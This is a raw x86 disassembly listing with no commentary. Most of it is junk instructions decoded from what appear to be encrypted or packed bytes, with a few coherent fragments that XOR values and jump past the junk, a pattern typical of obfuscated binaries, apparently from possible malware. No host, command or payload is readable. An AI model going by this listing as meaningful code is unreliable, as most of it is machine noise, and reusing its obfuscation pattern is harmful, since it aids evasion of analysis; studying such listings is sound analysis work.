  40b689:	call   0x7c8f:0xf8a1366f
  40b690:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40b692:	inc    esp
  40b693:	imul   esi,ebx,0xf6b6d75
  40b699:	rol    DWORD PTR ds:0x6255616,0xb6
  40b6a0:	xchg   ebp,eax
  40b6a1:	sub    al,0x3a
  40b6a3:	pusha  
  40b6a4:	cmp    BYTE PTR [edi],bh
  40b6a6:	jo     0x40b65a
  40b6a8:	bound  edx,QWORD PTR [esi+0x18e83a1f]
  40b6ae:	mov    eax,0xf0458b88
  40b6b3:	mov    ecx,DWORD PTR [ebp-0x14]
  40b6b6:	xor    ecx,esi
  40b6b8:	mov    edx,0xffcd8d65
  40b6bd:	sub    edx,ecx
  40b6bf:	add    DWORD PTR [eax],edx
  40b6c1:	mov    eax,ds:0x41227c
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	jmp    0x40ba15
  40b6cd:	mov    cl,0x1a
  40b6cf:	jns    0x40b704
  40b6d1:	xchg   ecx,eax
  40b6d2:	xor    DWORD PTR [ecx+0x2f888498],esi
  40b6d8:	mov    ch,0x6c
  40b6da:	mov    ch,0xbc
  40b6dc:	adc    ebx,ecx
  40b6de:	bnd jle 0x40b75f
  40b6e1:	cs jge 0x40b762
  40b6e4:	jle    0x40b6ea
  40b6e6:	and    BYTE PTR [edx-0x3b],bl
  40b6e9:	ins    DWORD PTR es:[edi],dx
  40b6ea:	xchg   edx,eax
  40b6eb:	jge    0x40b767
  40b6ed:	icebp  
  40b6ee:	ja     0x40b6f8
  40b6f0:	ins    DWORD PTR es:[edi],dx
  40b6f1:	rcr    BYTE PTR [eax+0x3f],0xfa
  40b6f5:	ja     0x40b729
  40b6f7:	div    BYTE PTR [ebx]
  40b6f9:	loop   0x40b6c8
  40b6fb:	jp     0x40b72e
  40b6fd:	scas   al,BYTE PTR es:[edi]
  40b6fe:	adc    DWORD PTR [edi+0x641d7c69],esi
  40b704:	aam    0xda
  40b706:	adc    eax,0x239983ce
  40b70b:	jecxz  0x40b786
  40b70d:	int3   
  40b70e:	ins    DWORD PTR es:[edi],dx
  40b70f:	push   es
  40b710:	dec    esi
  40b711:	inc    ebx
  40b712:	pop    DWORD PTR ds:0xd9b413a0
  40b718:	rcl    DWORD PTR [eax-0x493b3d17],0x8b
  40b71f:	pop    esp
  40b720:	fild   QWORD PTR [esi]
  40b722:	je     0x40b714
  40b724:	push   esi
  40b725:	adc    ch,BYTE PTR [edi+0x4b]
  40b728:	push   esp
  40b729:	imul   esi,DWORD PTR [ebx],0x7335a45b
  40b72f:	sbb    esi,DWORD PTR [ebp-0x2a261ff4]
  40b735:	pop    ds
  40b736:	pop    ds
  40b737:	scas   eax,DWORD PTR es:[edi]
  40b738:	pop    DWORD PTR [edi-0x44aad639]
  40b73e:	add    BYTE PTR [ebx],bh
  40b740:	adc    bl,BYTE PTR [edi+0x11]
  40b743:	lock inc ecx
  40b745:	je     0x40b73e
  40b747:	xchg   ebx,eax
  40b748:	sub    ebx,DWORD PTR [edx+0x9]
  40b74b:	mov    ds:0x8a5f4f2a,al
  40b750:	xlat   BYTE PTR ds:[ebx]
  40b751:	fld    QWORD PTR [ebx+0x41]
  40b754:	sbb    al,0xfc
  40b756:	cmp    DWORD PTR [ebx],esp
  40b758:	out    0xe6,eax
  40b75a:	lea    ebx,[edi]
  40b75c:	pop    esp
  40b75d:	mulps  xmm6,XMMWORD PTR [edx+eax*8-0x8]
  40b762:	xchg   esi,eax
  40b763:	leave  
  40b764:	adc    al,0xc
  40b766:	or     BYTE PTR [ecx],dl
  40b768:	out    dx,eax
  40b769:	shl    BYTE PTR [esi],1
  40b76b:	adc    bh,BYTE PTR [eax]
  40b76d:	cmp    BYTE PTR cs:[ebx],bl
  40b770:	xchg   ecx,eax
  40b771:	cmc    
  40b772:	sbb    eax,0x966c17d3
  40b777:	mov    ch,0x5b
  40b779:	push   esp
  40b77a:	test   al,0xbb
  40b77c:	ins    BYTE PTR es:[edi],dx
  40b77d:	lds    eax,FWORD PTR [edx]
  40b77f:	das    
  40b780:	sub    esp,DWORD PTR [eax-0x3f37b49]
  40b786:	add    eax,0xd2a8c25d
  40b78b:	sub    DWORD PTR [ebx-0x1f],esi
  40b78e:	mov    ds:0x9413472e,al
  40b793:	stos   DWORD PTR es:[edi],eax
  40b794:	add    al,0xc4
  40b796:	jb     0x40b74a
  40b798:	jne    0x40b7c6
  40b79a:	(bad)  
  40b79c:	mov    esi,0xecb55d16
  40b7a1:	jno    0x40b7a5
  40b7a3:	gs inc eax
  40b7a5:	(bad)  
  40b7a7:	inc    eax
  40b7a8:	mov    bh,0x43
  40b7aa:	and    ah,dh
  40b7ac:	push   esi
  40b7ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7ae:	jg     0x40b7c0
  40b7b0:	ror    DWORD PTR [ecx],cl
  40b7b2:	and    BYTE PTR [eax],0x72
  40b7b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7b6:	push   0xffffff9b
  40b7b8:	xlat   BYTE PTR ds:[ebx]
  40b7b9:	jge    0x40b797
  40b7bb:	mov    dl,0x98
  40b7bd:	(bad)  
  40b7be:	ss xchg edx,eax
  40b7c0:	aam    0xb9
  40b7c2:	inc    esi
  40b7c3:	fsub   QWORD PTR [eax]
  40b7c5:	xor    eax,0xe654a6f6
  40b7ca:	pusha  
  40b7cb:	add    DWORD PTR [ebx+0x430876c7],eax
  40b7d1:	call   0xd36d:0x53a2724
  40b7d8:	mov    esp,0xb734179f
  40b7dd:	shr    DWORD PTR [eax],1
  40b7df:	ds jb  0x40b7de
  40b7e2:	jecxz  0x40b809
  40b7e4:	in     eax,dx
  40b7e5:	jbe    0x40b771
  40b7e7:	inc    eax
  40b7e8:	pop    esi
  40b7e9:	adc    BYTE PTR [esi+0x7f],dl
  40b7ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7ed:	das    
  40b7ee:	push   ds
  40b7ef:	popf   
  40b7f0:	inc    edi
  40b7f1:	sub    ebp,0xffffff8c
  40b7f4:	mov    ebx,0x1251a779
  40b7f9:	and    ah,cl
  40b7fb:	into   
  40b7fc:	adc    BYTE PTR [ecx],bl
  40b7fe:	jbe    0x40b858
  40b800:	mov    esp,0xcc5c2d
  40b805:	pushf  
  40b806:	jle    0x40b791
  40b808:	(bad)  
  40b809:	shl    DWORD PTR [ebx+0x73c496c],cl
  40b80f:	ss out dx,al
  40b811:	push   ebp
  40b812:	mov    ds:0x7dd79cbd,eax
  40b817:	adc    al,BYTE PTR [edx]
  40b819:	jne    0x40b82a
  40b81b:	xchg   esp,eax
  40b81c:	and    DWORD PTR [esi+ebx*4-0x37c939f7],esp
  40b823:	lahf   
  40b824:	iret   
  40b825:	fmul   QWORD PTR [eax-0x7577334e]
  40b82b:	mov    ?,esp
  40b82d:	xchg   BYTE PTR [ecx+0x3df54d8c],cl
  40b833:	inc    eax
  40b834:	mov    ds:0x2511b08,eax
  40b839:	cdq    
  40b83a:	mov    WORD PTR ds:0xd171dd93,?
  40b840:	pop    eax
  40b841:	pusha  
  40b842:	push   ebx
  40b843:	xchg   edi,eax
  40b844:	popa   
  40b845:	add    dh,cl
  40b847:	cs repz jge 0x40b7d1
  40b84b:	mov    al,0x32
  40b84d:	mov    ah,0x39
  40b84f:	push   es
  40b850:	pop    ss
  40b851:	jae    0x40b7f1
  40b853:	or     ah,al
  40b855:	inc    esp
  40b856:	dec    edx
  40b857:	and    eax,0x64300a82
  40b85c:	fldcw  WORD PTR [ebx+0x79]
  40b85f:	inc    esp
  40b860:	sbb    BYTE PTR [esi+0x53],cl
  40b863:	call   0x6be7004d
  40b868:	(bad)  
  40b86a:	bswap  edi
  40b86c:	arpl   si,sp
  40b86e:	push   0x7d
  40b870:	jecxz  0x40b88a
  40b872:	cmp    eax,0xba9f7c48
  40b877:	mov    esi,0x685990c8
  40b87c:	scas   al,BYTE PTR es:[edi]
  40b87d:	lods   al,BYTE PTR ds:[esi]
  40b87e:	dec    eax
  40b87f:	mov    edi,0x84e525f1
  40b884:	gs jmp 0x227a:0x45972bbd
  40b88c:	rcr    DWORD PTR [ebx],1
  40b88e:	shl    DWORD PTR [esi],cl
  40b890:	or     al,0x82
  40b892:	adc    BYTE PTR [edx-0x80],bh
  40b895:	out    dx,eax
  40b896:	ss dec edi
  40b898:	xor    esi,DWORD PTR [ebx]
  40b89a:	pop    es
  40b89b:	xchg   edi,eax
  40b89c:	mov    ah,0x38
  40b89e:	cwde   
  40b89f:	pop    ebp
  40b8a0:	sbb    ecx,esi
  40b8a2:	pop    ebx
  40b8a3:	stos   DWORD PTR es:[edi],eax
  40b8a4:	std    
  40b8a5:	mov    dh,0xd4
  40b8a7:	(bad)  
  40b8a8:	xlat   BYTE PTR ds:[ebx]
  40b8a9:	outs   dx,DWORD PTR ds:[si]
  40b8ab:	push   ss
  40b8ac:	ficom  WORD PTR [eiz*4-0x5e2b9a71]
  40b8b3:	dec    ecx
  40b8b4:	add    esp,0x9807b6a6
  40b8ba:	inc    esi
  40b8bb:	push   edi
  40b8bc:	xor    ch,dh
  40b8be:	cwde   
  40b8bf:	sbb    ebp,DWORD PTR [eax+0x41aa6229]
  40b8c5:	leave  
  40b8c6:	out    0x27,eax
  40b8c8:	xlat   BYTE PTR ds:[ebx]
  40b8c9:	or     esi,ebx
  40b8cb:	pop    ss
  40b8cc:	je     0x40b8d1
  40b8ce:	dec    ebp
  40b8cf:	pop    eax
  40b8d0:	es push 0x690e62a3
  40b8d6:	enter  0xcd1b,0x32
  40b8da:	in     eax,dx
  40b8db:	imul   esi,esp,0xffffffac
  40b8de:	(bad)  
  40b8df:	div    BYTE PTR [esi]
  40b8e1:	es mov ch,0x24
  40b8e4:	cld    
  40b8e5:	sbb    edi,DWORD PTR ss:[eax]
  40b8e8:	mov    bh,0x41
  40b8ea:	(bad)  
  40b8eb:	test   al,0x49
  40b8ed:	repz cmp al,BYTE PTR [ebx+0x72]
  40b8f1:	cwde   
  40b8f2:	rcr    BYTE PTR [ebp+0x75],1
  40b8f5:	lods   al,BYTE PTR ds:[esi]
  40b8f6:	in     eax,0x96
  40b8f8:	jbe    0x40b930
  40b8fa:	push   ebp
  40b8fb:	in     eax,dx
  40b8fc:	(bad)  
  40b8fd:	jmp    0x40b88f
  40b8ff:	sbb    esi,DWORD PTR [ecx]
  40b901:	lea    eax,[ebp+0x0]
  40b904:	nop
  40b905:	xchg   eax,edi
  40b907:	sub    ecx,DWORD PTR [esi-0x25e20600]
  40b90d:	sbb    DWORD PTR ds:0x7ccd0db6,edx
  40b913:	jne    0x40b994
  40b915:	sub    al,0x61
  40b917:	mov    esi,0xc0247ed3
  40b91c:	mov    ecx,0x21fb49f3
  40b921:	loop   0x40b935
  40b923:	add    DWORD PTR [eax-0x7a8c86f6],ebp
  40b929:	push   ebp
  40b92a:	jmp    0x81bb:0x463d1454
  40b931:	mov    eax,ebx
  40b933:	mov    ah,0x6f
  40b935:	xchg   esp,eax
  40b936:	daa    
  40b937:	adc    dl,BYTE PTR [ebx]
  40b939:	jns    0x40b93a
  40b93b:	call   0xb26c:0x4862a74
  40b942:	lods   eax,DWORD PTR ds:[esi]
  40b943:	sub    al,0x2a
  40b945:	push   eax
  40b946:	mov    dl,0x57
  40b948:	push   ss
  40b949:	xchg   ebp,eax
  40b94a:	cmp    BYTE PTR [eax+0x4403aca1],ch
  40b950:	aam    0x6f
  40b952:	adc    cl,BYTE PTR [esi]
  40b954:	xlat   BYTE PTR ds:[ebx]
  40b955:	ins    BYTE PTR es:[edi],dx
  40b956:	out    dx,eax
  40b957:	test   BYTE PTR [ebx-0x1fc84618],cl
  40b95d:	sbb    eax,0xc945e77a
  40b962:	push   edx
  40b963:	xchg   esi,eax
  40b964:	adc    al,0x6b
  40b966:	jbe    0x40b9d2
  40b968:	dec    eax
  40b969:	jns    0x40b9ce
  40b96b:	pop    edx
  40b96c:	mov    ds:0xdb10309b,al
  40b971:	por    mm1,QWORD PTR [ebx-0x41ab690a]
  40b978:	xchg   esp,eax
  40b979:	addr16 xchg esi,eax
  40b97b:	push   0x22
  40b97d:	inc    ecx
  40b97e:	aad    0xb9
  40b980:	pop    es
  40b981:	shl    esp,0x61
  40b984:	retw   0x65b3
  40b988:	out    dx,al
  40b989:	mov    ebp,DWORD PTR [ebx]
  40b98b:	das    
  40b98c:	jl     0x40b91b
  40b98e:	ret    
  40b98f:	add    DWORD PTR [ecx],esi
  40b991:	retf   0xa55b
  40b994:	adc    eax,0x645b6a23
  40b999:	iret   
  40b99a:	jmp    0x7d7b2c27
  40b99f:	out    dx,al
  40b9a0:	adc    al,0x7c
  40b9a2:	pop    edi
  40b9a3:	iret   
  40b9a4:	pop    ebx
  40b9a5:	cmp    BYTE PTR [edi+0x19],bl
  40b9a8:	mov    WORD PTR [eax],?
  40b9aa:	inc    BYTE PTR [esi+0x1f70db74]
  40b9b0:	jg     0x40b9df
  40b9b2:	add    al,0xf
  40b9b4:	popf   
  40b9b5:	xlat   BYTE PTR ds:[ebx]
  40b9b6:	mov    ds:0x7eff5361,al
  40b9bb:	fisub  WORD PTR [ecx-0x1a]
  40b9be:	das    
  40b9bf:	and    DWORD PTR [ebx],ecx
  40b9c1:	test   BYTE PTR [esi+0x65],bh
  40b9c4:	pop    ds
  40b9c5:	imul   ecx,ebp,0xffffffb9
  40b9c8:	out    dx,al
  40b9c9:	sub    DWORD PTR [ebx+0x5ccf8318],ebp
  40b9cf:	xchg   edx,eax
  40b9d0:	(bad)  
  40b9d1:	std    
  40b9d2:	mov    WORD PTR [esi],ds
  40b9d4:	inc    ebx
  40b9d5:	and    al,0x15
  40b9d7:	retf   0x3bd9
  40b9da:	and    al,0x46
  40b9dc:	aam    0xb9
  40b9de:	arpl   WORD PTR [ecx-0x7],cx
  40b9e1:	dec    ebx
  40b9e2:	sub    DWORD PTR [esi],0x2b7ae05b
  40b9e8:	push   cs
  40b9e9:	jo     0x40ba01
  40b9eb:	leave  
  40b9ec:	sub    ecx,ebx
  40b9ee:	int    0x57
  40b9f0:	cld    
  40b9f1:	xor    eax,0x9c520116
  40b9f6:	enter  0x48a4,0xec
  40b9fa:	test   eax,0x9bb96ee2
  40b9ff:	or     eax,0xf33bc11c
  40ba04:	ror    DWORD PTR [esp+eax*4-0x20],0x9f
  40ba09:	xor    al,0xf7
  40ba0b:	xor    cl,BYTE PTR [eax+edx*1+0x21102db9]
  40ba12:	add    DWORD PTR [ecx+0x7f],ebx
  40ba15:	mov    cx,WORD PTR [ebp-0x4]
  40ba19:	movzx  ecx,cx
  40ba1c:	add    ecx,DWORD PTR [eax]
  40ba1e:	mov    DWORD PTR [ebp-0x1c],ecx
  40ba21:	mov    eax,DWORD PTR [ebp+0xc]
  40ba24:	jmp    0x40bd71
  40ba29:	jae    0x40ba29
  40ba2b:	push   ebx
  40ba2c:	lahf   
  40ba2d:	jae    0x40baa2
  40ba2f:	jae    0x40ba83
  40ba31:	pop    edi
  40ba32:	dec    ebp
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	in     al,dx
  40ba35:	leave  
  40ba36:	fwait
  40ba37:	adc    BYTE PTR [ebx],dl
  40ba39:	mov    ecx,esi
  40ba3b:	jle    0x40babb
  40ba3d:	cs jge 0x40babe
  40ba40:	jle    0x40ba42
  40ba42:	push   eax
  40ba43:	(bad)  
  40ba44:	sahf   
  40ba45:	aam    0x4d
  40ba47:	or     bh,bl
  40ba49:	push   0x7c773584
  40ba4e:	sub    DWORD PTR [ebx],edi
  40ba50:	xor    al,0x4f
  40ba52:	data16 mov WORD PTR [edx+0x69798f02],?
  40ba59:	ja     0x40bacd
  40ba5b:	sbb    eax,0x24406a73
  40ba60:	fwait
  40ba61:	or     BYTE PTR [edx],ch
  40ba63:	fst    DWORD PTR [edi+ebp*4]
  40ba66:	dec    esi
  40ba67:	test   eax,0x8ac38b73
  40ba6c:	xchg   ecx,eax
  40ba6d:	inc    edx
  40ba6e:	into   
  40ba6f:	aaa    
  40ba70:	push   es
  40ba71:	jae    0x40ba52
  40ba73:	out    0x36,eax
  40ba75:	ins    DWORD PTR es:[edi],dx
  40ba76:	sti    
  40ba77:	fwait
  40ba78:	push   edx
  40ba79:	dec    esi
  40ba7a:	(bad)
  40ba7d:	mov    eax,0xcebc4c2f
  40ba82:	adc    al,0xc4
  40ba84:	mov    dh,0x99
  40ba86:	push   ecx
  40ba87:	xchg   BYTE PTR [ecx],dh
  40ba89:	lods   eax,DWORD PTR ds:[esi]
  40ba8a:	push   esi
  40ba8b:	inc    esp
  40ba8c:	jne    0x40ba1f
  40ba8e:	mov    cl,0xfe
  40ba90:	(bad)  
  40ba91:	adc    al,0x47
  40ba93:	or     al,BYTE PTR [ebx]
  40ba95:	cld    
  40ba96:	out    dx,al
  40ba97:	leave  
  40ba98:	or     dl,BYTE PTR [ecx+edi*2-0x37f8b5ef]
  40ba9f:	out    dx,al
  40baa0:	sub    DWORD PTR [ebx+0x7868c0bd],ebp
  40baa6:	dec    esp
  40baa7:	push   es
  40baa8:	fisttp WORD PTR [ebp+0x18]
  40baab:	out    0x87,al
  40baad:	jno    0x40bb00
  40baaf:	test   eax,0x3ddf8f52
  40bab4:	xchg   ebp,eax
  40bab5:	add    DWORD PTR [esi],esi
  40bab7:	mov    eax,ds:0x38d41dc8
  40babc:	mov    bl,0x22
  40babe:	xor    eax,0x2ea4ba48
  40bac3:	and    DWORD PTR [edi],0x36
  40bac6:	jl     0x40bb0a
  40bac8:	in     al,0xd1
  40baca:	fst    st(6)
  40bacc:	(bad)  
  40bacd:	aaa    
  40bace:	mov    ds:0xb0a42088,al
  40bad3:	add    eax,0x4010da78
  40bad8:	imul   edi,DWORD PTR [ebp-0xf28fcdc],0x2c
  40badf:	add    dl,0xd
  40bae2:	lods   eax,DWORD PTR ds:[esi]
  40bae3:	scas   eax,DWORD PTR es:[edi]
  40bae4:	pop    ecx
  40bae5:	mov    edi,DWORD PTR [eax-0x18]
  40bae8:	cmp    BYTE PTR [esi+esi*8],bh
  40baeb:	sti    
  40baec:	xor    eax,0x1403f9d7
  40baf1:	daa    
  40baf2:	lea    ebp,[ebx]
  40baf4:	push   ss
  40baf5:	ins    BYTE PTR es:[edi],dx
  40baf6:	and    DWORD PTR [esi-0x6e10c8d6],eax
  40bafc:	cld    
  40bafd:	lock sub al,0x78
  40bb00:	lods   al,BYTE PTR ds:[esi]
  40bb01:	outs   dx,BYTE PTR ds:[esi]
  40bb02:	xor    bh,dh
  40bb04:	std    
  40bb05:	pop    edx
  40bb06:	mov    al,0xff
  40bb08:	mov    esp,0xb669aea2
  40bb0d:	sub    eax,ebx
  40bb0f:	rol    DWORD PTR [bp+di-0x6d],cl
  40bb13:	(bad)  
  40bb14:	pop    es
  40bb15:	jno    0x40bb74
  40bb17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb18:	jge    0x40bb65
  40bb1a:	push   ebp
  40bb1b:	ss xor eax,0x576d5266
  40bb21:	icebp  
  40bb22:	sahf   
  40bb23:	sbb    al,0x83
  40bb25:	fs (bad) 
  40bb27:	retf   
  40bb28:	fisttp WORD PTR ds:0x461f337c
  40bb2e:	fsub   DWORD PTR [ebp-0x52]
  40bb31:	je     0x40bb7a
  40bb33:	loop   0x40bb8c
  40bb35:	push   ss
  40bb36:	ret    
  40bb37:	and    eax,0x2069cdc1
  40bb3c:	mov    ebx,0x28cd28d
  40bb41:	int    0x87
  40bb43:	cmp    eax,0xd6212f47
  40bb48:	pop    ds
  40bb49:	into   
  40bb4a:	arpl   WORD PTR ds:0xbed1dadb,ax
  40bb50:	jl     0x40bae2
  40bb52:	jle    0x40bbb9
  40bb54:	mov    bl,0x4b
  40bb56:	and    al,0x8b
  40bb58:	cld    
  40bb59:	adc    eax,0x99d365e
  40bb5e:	fmul   st(6),st
  40bb60:	mov    ebx,0x4f50c68c
  40bb65:	arpl   si,sp
  40bb67:	jge    0x40bb0f
  40bb69:	je     0x40bb4b
  40bb6b:	sub    bh,BYTE PTR [ecx-0xe3f56c3]
  40bb71:	mov    cl,0xb8
  40bb73:	test   BYTE PTR [ebp+0x4f],dh
  40bb76:	dec    ecx
  40bb77:	xor    DWORD PTR [edi],esi
  40bb79:	push   ecx
  40bb7a:	jl     0x40bb49
  40bb7c:	adc    DWORD PTR [edi+0x73],esp
  40bb7f:	std    
  40bb80:	shl    DWORD PTR [ecx+edi*2-0x61],1
  40bb84:	ins    BYTE PTR es:[edi],dx
  40bb85:	mov    BYTE PTR [ebx-0x645d0e82],0xd4
  40bb8c:	or     dh,0x7c
  40bb8f:	fild   WORD PTR [edx+eax*4+0x65b250ae]
  40bb96:	sbb    eax,0x3614915d
  40bb9b:	pop    esp
  40bb9c:	pop    edi
  40bb9d:	lahf   
  40bb9e:	gs addr16 dec ebx
  40bba1:	push   edi
  40bba2:	dec    edx
  40bba3:	stos   DWORD PTR es:[edi],eax
  40bba4:	and    DWORD PTR [esi],ebp
  40bba6:	cs cmc 
  40bba8:	sub    al,0x32
  40bbaa:	mov    eax,ds:0xaaa59c6a
  40bbaf:	mov    bh,0x70
  40bbb1:	push   esp
  40bbb2:	mov    eax,ds:0x6ba64e4a
  40bbb7:	arpl   WORD PTR [ecx],si
  40bbb9:	test   BYTE PTR [ebx],ah
  40bbbb:	iret   
  40bbbc:	bound  ebp,QWORD PTR ds:0xd3a53124
  40bbc2:	jecxz  0x40bb77
  40bbc4:	outs   dx,DWORD PTR ds:[esi]
  40bbc5:	mov    al,0xb8
  40bbc7:	mov    edx,DWORD PTR [ecx+eax*4]
  40bbca:	nop
  40bbcb:	pop    eax
  40bbcc:	xchg   esi,eax
  40bbcd:	pop    ecx
  40bbce:	hlt    
  40bbcf:	stc    
  40bbd0:	call   0x42cae749
  40bbd5:	xor    eax,0x4979d0ac
  40bbda:	mov    ecx,0x16a45e6d
  40bbdf:	sti    
  40bbe0:	ficomp DWORD PTR [eax]
  40bbe2:	ins    BYTE PTR es:[edi],dx
  40bbe3:	das    
  40bbe4:	sub    edi,edx
  40bbe6:	adc    al,0x27
  40bbe8:	(bad)  
  40bbe9:	adc    al,0xd2
  40bbeb:	mov    cl,0x71
  40bbed:	jae    0x40bbf7
  40bbef:	sub    eax,DWORD PTR [edi]
  40bbf1:	icebp  
  40bbf2:	fwait
  40bbf3:	pusha  
  40bbf4:	cmp    eax,0xeed67a8f
  40bbf9:	sub    dl,BYTE PTR [eax+0x2e36c7ca]
  40bbff:	jge    0x40bc3d
  40bc01:	xchg   ecx,eax
  40bc02:	into   
  40bc03:	aam    0xd1
  40bc05:	enter  0x3d1f,0xaa
  40bc09:	outs   dx,DWORD PTR ds:[esi]
  40bc0a:	fisttp DWORD PTR [edx+0x51bd4453]
  40bc10:	mov    ah,0xf6
  40bc12:	dec    edx
  40bc13:	jge    0x40bc93
  40bc15:	jmp    0x40bbc5
  40bc17:	mov    ds:0xc220e68f,al
  40bc1c:	jns    0x40bc3a
  40bc1e:	pop    esi
  40bc1f:	mov    ch,0x6c
  40bc21:	sbb    esi,DWORD PTR [eax-0x6]
  40bc24:	dec    ecx
  40bc25:	jns    0x40bc42
  40bc27:	in     al,0x5e
  40bc29:	push   cs
  40bc2a:	retf   
  40bc2b:	pusha  
  40bc2c:	mov    ds:0x843686e3,eax
  40bc31:	inc    edi
  40bc32:	jmp    0x40bc69
  40bc34:	sbb    BYTE PTR [edx+0x54],al
  40bc37:	jne    0xda665875
  40bc3d:	pop    esp
  40bc3e:	xchg   ecx,eax
  40bc3f:	sub    BYTE PTR [ecx-0x3],dl
  40bc42:	es jbe 0x40bc95
  40bc45:	inc    eax
  40bc46:	pop    ebp
  40bc47:	pop    ss
  40bc48:	dec    esi
  40bc49:	scas   eax,DWORD PTR es:[edi]
  40bc4a:	adc    al,0x81
  40bc4c:	(bad)  
  40bc4e:	xor    BYTE PTR [edx+0xd425731],dl
  40bc54:	jbe    0x40bc2d
  40bc56:	push   ss
  40bc57:	jo     0x40bbd9
  40bc59:	out    0x8f,al
  40bc5b:	push   edi
  40bc5c:	test   DWORD PTR ds:0xe3bb9375,edi
  40bc62:	pop    ss
  40bc63:	repz mul DWORD PTR [edx]
  40bc66:	outs   dx,DWORD PTR ds:[esi]
  40bc67:	jmp    0x40bcaf
  40bc69:	leave  
  40bc6a:	mov    ch,0xc7
  40bc6c:	test   al,0xc3
  40bc6e:	in     eax,dx
  40bc6f:	test   al,0xd8
  40bc71:	ror    BYTE PTR [eax-0x3c339248],1
  40bc77:	repnz shl BYTE PTR [ebx],cl
  40bc7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc7b:	int3   
  40bc7c:	push   edx
  40bc7d:	rcr    bl,cl
  40bc7f:	lds    edi,FWORD PTR [edi-0x16]
  40bc82:	adc    cl,BYTE PTR [edi+0x72c1aa39]
  40bc88:	jns    0x40bc75
  40bc8a:	sbb    DWORD PTR [ebx],esi
  40bc8c:	fsub   QWORD PTR [ecx-0x41]
  40bc8f:	cdq    
  40bc90:	lock ror esi,0x0
  40bc94:	dec    esp
  40bc95:	aad    0xc6
  40bc97:	mov    ebx,0xde3d71a9
  40bc9c:	pop    esp
  40bc9d:	push   0x57
  40bc9f:	pop    esi
  40bca0:	sahf   
  40bca1:	dec    ebx
  40bca2:	out    dx,eax
  40bca3:	bound  edx,QWORD PTR [ecx]
  40bca5:	mov    ebx,0xa5026bde
  40bcaa:	fwait
  40bcab:	icebp  
  40bcac:	test   al,0xa2
  40bcae:	and    ch,dl
  40bcb0:	mov    eax,ds:0xeaf629b2
  40bcb5:	retf   0xdf33
  40bcb8:	fisttp WORD PTR [ebp+0x2726359f]
  40bcbe:	loop   0x40bcb5
  40bcc0:	loopne 0x40bc94
  40bcc2:	push   edx
  40bcc3:	in     eax,dx
  40bcc4:	retf   0x631d
  40bcc7:	mov    DWORD PTR [esi-0x68],edx
  40bcca:	push   0x95ccc710
  40bccf:	add    ecx,DWORD PTR [ebp+0x4d92512a]
  40bcd5:	imul   esi,DWORD PTR [eax+0x2a6d8794],0xf8b2848a
  40bcdf:	lods   al,BYTE PTR ds:[esi]
  40bce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bce1:	jmp    0x40bd4e
  40bce3:	xor    cl,ch
  40bce5:	xchg   BYTE PTR [ebp-0x3d],cl
  40bce8:	push   edx
  40bce9:	gs cs out dx,eax
  40bcec:	into   
  40bced:	pop    edx
  40bcee:	cmp    DWORD PTR [edx-0x14396983],edx
  40bcf4:	xchg   edi,eax
  40bcf5:	loop   0x40bc78
  40bcf7:	in     eax,dx
  40bcf8:	inc    ecx
  40bcf9:	ret    
  40bcfa:	xchg   ecx,eax
  40bcfb:	xchg   ebx,eax
  40bcfc:	xor    edi,esp
  40bcfe:	cmp    BYTE PTR [eax],ch
  40bd00:	popf   
  40bd01:	cmp    DWORD PTR [edx+0x52d49f5d],ebp
  40bd07:	cmp    ebx,DWORD PTR [ebx+0x3ca5a592]
  40bd0d:	push   edi
  40bd0e:	mov    WORD PTR [ecx+0x286e51f1],?
  40bd14:	push   es
  40bd15:	pop    edx
  40bd16:	dec    ebx
  40bd17:	cmp    eax,0xe2f60f46
  40bd1c:	add    BYTE PTR [ebx],dh
  40bd1e:	mov    edx,0x363f45a1
  40bd23:	add    al,0x61
  40bd25:	int3   
  40bd26:	xchg   ebp,eax
  40bd27:	loope  0x40bd34
  40bd29:	sub    al,0x27
  40bd2b:	imul   esi
  40bd2d:	or     eax,0x11fcc644
  40bd32:	loopne 0x40bcfb
  40bd34:	adc    ch,BYTE PTR [edx-0x64]
  40bd37:	mov    ds:0x1693df79,al
  40bd3c:	xor    eax,0x5afd8de4
  40bd41:	xchg   BYTE PTR [edx-0x3768ee3f],ch
  40bd47:	fild   WORD PTR [edi+0x3e9ed3a1]
  40bd4d:	mov    edi,DWORD PTR [esi-0x59b61a1d]
  40bd53:	loope  0x40bd1b
  40bd55:	xchg   esi,eax
  40bd56:	add    esi,0x274b9e00
  40bd5c:	xchg   BYTE PTR [edi-0xd],dl
  40bd5f:	into   
  40bd60:	add    al,0x64
  40bd62:	pop    esp
  40bd63:	ja     0x40bcf6
  40bd65:	jg     0x40bdc3
  40bd67:	(bad)  
  40bd68:	scas   al,BYTE PTR es:[edi]
  40bd69:	pop    edx
  40bd6a:	sti    
  40bd6b:	jecxz  0x40bd8f
  40bd6d:	pop    eax
  40bd6e:	fisttp WORD PTR [esi-0x4a]
  40bd71:	mov    ecx,DWORD PTR [ebp+0xc]
  40bd74:	xor    eax,esi
  40bd76:	add    eax,eax
  40bd78:	xor    ecx,esi
  40bd7a:	jmp    0x40c0c7
  40bd7f:	push   DWORD PTR [ebx-0xe4f1304]
  40bd85:	outs   dx,DWORD PTR ds:[esi]
  40bd86:	jno    0x40bd30
  40bd88:	mov    dh,0x9c
  40bd8a:	repnz into 
  40bd8c:	rcl    DWORD PTR [ebp+0x7efcb9f6],cl
  40bd92:	jle    0x40bdc2
  40bd94:	jge    0x40be14
  40bd96:	jle    0x40bdd2
  40bd98:	and    al,0x2e
  40bd9a:	adc    al,0xee
  40bd9c:	dec    esp
  40bd9d:	enter  0xf0d1,0xea
  40bda1:	inc    esi
  40bda2:	int3   
  40bda3:	jno    0x40bdd8
  40bda5:	arpl   WORD PTR [edx+0x7f5447d7],ax
  40bdab:	pop    eax
  40bdac:	jae    0x40be05
  40bdae:	sbb    esp,edx
  40bdb0:	adc    DWORD PTR [eax+0x3c51753e],ebp
  40bdb6:	cwde   
  40bdb7:	arpl   WORD PTR [edi-0x15561ef3],cx
  40bdbd:	xchg   ebp,eax
  40bdbe:	fisub  WORD PTR [edi-0xc]
